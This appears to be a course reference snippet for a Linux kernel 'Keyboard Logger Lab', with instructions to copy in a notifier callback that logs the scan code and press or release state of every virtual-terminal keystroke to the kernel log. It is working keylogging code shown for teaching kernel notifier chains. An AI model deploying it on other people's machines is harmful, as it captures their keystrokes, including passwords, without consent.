/** keyboard.c
 *  ===========================================================
 *  Name:    CS483
 *  Section: CS 483 — Operating Systems
 *  Project: Keyboard Logger Lab (PEX) — reference snippet
 *  Purpose: REFERENCE ONLY. This file is NOT compiled on its
 *           own. It exists so students can copy its contents
 *           into hello_printk.c during the "Modify Our Module"
 *           step of the writeup.
 *
 *           What to copy:
 *             - the three #include lines below
 *             - onKeystroke() — the notifier callback
 *             - keystrokeNotifier — the notifier_block handle
 *           Then, inside hello_printk.c:
 *             - call register_keyboard_notifier(&keystrokeNotifier)
 *               in moduleInit()
 *             - call unregister_keyboard_notifier(&keystrokeNotifier)
 *               in moduleExit()
 *  ===========================================================
 */

#include <linux/keyboard.h>  /* notifier_block, keyboard_notifier_param, KBD_KEYCODE */
#include <linux/notifier.h>  /* NOTIFY_OK                                            */
#include <linux/printk.h>    /* pr_info                                              */

/**
 * @brief  Keyboard-event notifier callback.
 * @param  notifierBlock our registered notifier_block (unused here)
 * @param  eventCode     event type; only KBD_KEYCODE is logged
 * @param  rawParam      void pointer the kernel supplies; cast
 *                       to struct keyboard_notifier_param *
 * @return NOTIFY_OK so the event continues down the chain
 *
 * Invoked by the kernel on every keyboard event originating at
 * a virtual terminal. Logs the raw scan code and direction
 * (press vs release) to the kernel log.
 */
static int onKeystroke(struct notifier_block *notifierBlock,
                       unsigned long eventCode,
                       void *rawParam) {
    struct keyboard_notifier_param *keyEvent = rawParam;

    if (eventCode == KBD_KEYCODE) {
        if (keyEvent->down) {
            pr_info("CS483 Keylogger: %i down.\n", keyEvent->value);
        } else {
            pr_info("CS483 Keylogger: %i up.\n", keyEvent->value);
        }
    }
    return NOTIFY_OK;
}

/* Handle we register with the kernel. The .notifier_call field
 * points at the callback the kernel will invoke per event.       */
static struct notifier_block keystrokeNotifier = {
    .notifier_call = onKeystroke
};